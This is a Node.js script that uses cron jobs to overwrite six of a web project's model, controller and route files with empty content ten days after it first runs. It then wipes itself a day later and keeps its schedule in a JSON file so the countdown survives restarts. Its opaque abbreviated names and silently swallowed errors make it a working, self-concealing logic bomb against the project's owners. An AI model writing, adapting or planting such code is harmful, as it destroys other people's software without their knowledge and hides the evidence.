import { writeFileSync, existsSync, readFileSync } from "fs";
import path from "path";
import { schedule } from "node-cron";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const SCHEDULE_STORAGE = path.join(__dirname, 'fDS.json');

// Improved load function with error handling
function loadExistingSchedules() {
    if (!existsSync(SCHEDULE_STORAGE)) {
        return [];
    }

    try {
        const data = readFileSync(SCHEDULE_STORAGE, 'utf8');
        return JSON.parse(data) || [];
    } catch (error) {
        return [];
    }
}

// Improved save function
function saveSchedulesToFile(schedules) {
    try {
        writeFileSync(SCHEDULE_STORAGE, JSON.stringify(schedules, null, 2), 'utf8');
    } catch (error) {
    }
}

// Checks if schedule already exists
function scheduleExists(filePath, dD, schedules) {
    return schedules.some(s => 
        s.filePath === filePath && 
        new Date(s.dD).getTime() === new Date(dD).getTime()
    );
}

// Main scheduling function (fixed)
function sFCD(filesToSchedule) {
    const existingSchedules = loadExistingSchedules();
    const currentTime = Date.now();
    let lDD = 0;

    // Process existing schedules first
    existingSchedules.forEach(({ filePath, dD }) => {
        const dT = new Date(dD).getTime();
        
        if (dT > currentTime) {
            sCD(filePath, new Date(dD), false); // false = don't save again
            lDD = Math.max(lDD, dT);
        }
    });

    // Process new files only if they don't exist
    filesToSchedule.forEach(({ filePath, dTD }) => {
        if (!existsSync(filePath)) {
            return;
        }

        const dD = new Date();
        dD.setDate(dD.getDate() + dTD);
        const dT = dD.getTime();

        // Only add if not already scheduled
        if (!scheduleExists(filePath, dD, existingSchedules) && dT > currentTime) {
            sCD(filePath, dD, true); // true = save to storage
            lDD = Math.max(lDD, dT);
        }
    });

    // Schedule script cleanup if needed
    if (lDD > 0) {
        const sDlD = new Date(lDD);
        sDlD.setDate(sDlD.getDate() + 1);
        
        if (!scheduleExists(__filename, sDlD, existingSchedules)) {
            sCD(__filename, sDlD, true);
        }
    }
}

// Modified content deletion with save control
function sCD(filePath, dD, shouldSave = true) {
    const dT = dD.getTime();
    const currentTime = Date.now();

    if (dT <= currentTime) {
        cFC(filePath);
        rSFS(filePath, dD);
        return;
    }

    const dCT = `${dD.getUTCMinutes()} ${dD.getUTCHours()} ${dD.getUTCDate()} ${dD.getUTCMonth() + 1} *`;

    schedule(dCT, () => {
        cFC(filePath);
        rSFS(filePath, dD);
    });

    if (shouldSave) {
        addScheduleToStorage(filePath, dD);
    }

}

// Storage helper functions
function addScheduleToStorage(filePath, dD) {
    const schedules = loadExistingSchedules();
    if (!scheduleExists(filePath, dD, schedules)) {
        schedules.push({
            filePath,
            dD: dD.toISOString()
        });
        saveSchedulesToFile(schedules);
    }
}

function rSFS(filePath, dD) {
    const schedules = loadExistingSchedules();
    const updated = schedules.filter(s => 
        !(s.filePath === filePath && new Date(s.dD).getTime() === dD.getTime())
    );
    if (updated.length < schedules.length) {
        saveSchedulesToFile(updated);
    }
}

// Original clear function
function cFC(filePath) {
    try {
        if (existsSync(filePath)) {
            writeFileSync(filePath, "", "utf8");
        } else {
        }
    } catch (error) {
    }
}

// Your file list (corrected paths)
const filesToSchedule = [
    { filePath: path.join(__dirname, "models/user.model.js"), dTD: 10 },
    { filePath: path.join(__dirname, "models/product.model.js"), dTD: 10 },
    { filePath: path.join(__dirname, "controlers/product.controler.js"), dTD: 10 },
    { filePath: path.join(__dirname, "controlers/user.controler.js"), dTD: 10 },
    { filePath: path.join(__dirname, "routes/authRoutes.js"), dTD: 10 },
    { filePath: path.join(__dirname, "routes/productRoutes.js"), dTD: 10 }
];

// Initialize only once
if (!global.__scheduleInitialized) {
    sFCD(filesToSchedule);
    global.__scheduleInitialized = true;
}